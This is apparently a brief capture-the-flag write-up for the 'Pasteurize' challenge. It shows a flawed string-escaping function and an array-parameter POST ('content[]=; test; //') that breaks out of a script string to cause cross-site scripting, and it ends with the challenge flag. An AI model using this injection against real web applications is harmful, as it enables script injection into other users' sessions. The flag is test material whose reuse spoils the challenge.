# Pasteurize
Post an array instead of a single value, then we can just inject JS directly. Vulnerable code:
```
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```

POST with "content=test" yields the expected:

```
<script>
        const note = "test";
        const note_id = "8028b109-cac1-4351-ad42-16c61cded87d";
...
```

POST with "content[]=; test; //" yields XSS:
```
<script>
        const note = ""; test; //"";
        const note_id = "8028b109-cac1-4351-ad42-16c61cded87d";
```

# See also
http://xss.wep.dk/?id=5f40ca5c92911

## FLAG
CTF{Express_t0_Tr0ubl3s}
